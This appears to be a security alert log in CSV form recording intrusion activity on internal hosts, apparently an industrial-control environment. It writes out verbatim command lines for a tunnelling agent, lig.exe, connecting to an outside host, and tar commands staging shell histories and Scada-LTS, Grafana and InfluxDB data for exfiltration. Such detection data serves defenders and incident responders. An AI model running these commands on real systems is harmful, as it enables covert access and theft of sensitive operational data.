"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T12:35:55.909Z","10.0.8.11","Low","30","This file meets the machine learning-based on-sensor AV protection's low confidence threshold for malicious files.","\\tsclient\share\lig.exe  -connect a.hsl.co.at:443 -accept-fingerprint DF1F0E0850FCB34433FE38D9D07C509139628F9067C060409A7BE9C25B3BA7C8","",
"2025-03-28T12:34:50.765Z","10.0.8.11","Low","30","This file meets the machine learning-based on-sensor AV protection's low confidence threshold for malicious files.","\\tsclient\share\lig.exe  -connect a.hsl.co.at:11601 -accept-fingerprint DF1F0E0850FCB34433FE38D9D07C509139628F9067C060409A7BE9C25B3BA7C8","",
"2025-03-28T12:28:25.796Z","10.0.8.11","Low","30","This file meets the machine learning-based on-sensor AV protection's low confidence threshold for malicious files.","\\tsclient\share\lig.exe  -connect a.hsl.co.at:11601 -accept-fingerprint DF1F0E0850FCB34433FE38D9D07C509139628F9067C060409A7BE9C25B3BA7C8","",
"2025-03-28T12:25:17.95Z","10.0.8.11","Low","30","This file meets the machine learning-based on-sensor AV protection's low confidence threshold for malicious files.","\\tsclient\share\lig.exe  -connect a.hsl.co.at:11601 -ignore-cert","",
"2025-03-28T09:00:15.204Z","10.0.8.45","High","70","A process appears to be staging data. Adversaries can migrate data to a central location prior to exfiltration. Review the accessed files and process tree.","tar czf /tmp/linux_logs.tar.gz --ignore-failed-read /root/.bash_history /home/ubuntu/.bash_history /home/admin/.bash_history /var/log /var/lib/influxdb/ /var/lib/grafana/ /opt/scadalts/mysql/server/data/ /opt/scadalts/mysql/server/mysqld.log /opt/scadalts/tomcat/server/logs/","",
"2025-03-28T08:30:02.628Z","10.0.8.45","High","70","A process appears to be staging data. Adversaries can migrate data to a central location prior to exfiltration. Review the accessed files and process tree.","tar czf /tmp/linux_logs.tar.gz --ignore-failed-read /root/.bash_history /home/ubuntu/.bash_history /home/admin/.bash_history /var/log /var/lib/influxdb/ /var/lib/grafana/ /opt/scadalts/mysql/server/data/ /opt/scadalts/mysql/server/mysqld.log /opt/scadalts/tomcat/server/logs/","",
"2025-03-28T08:30:02.449Z","10.0.8.60","High","70","A process appears to be staging data. Adversaries can migrate data to a central location prior to exfiltration. Review the accessed files and process tree.","tar czf /tmp/linux_logs.tar.gz --ignore-failed-read /root/.bash_history /home/ubuntu/.bash_history /home/admin/.bash_history /var/log /var/lib/influxdb/ /var/lib/grafana/ /opt/scadalts/mysql/server/data/ /opt/scadalts/mysql/server/mysqld.log /opt/scadalts/tomcat/server/logs/","",
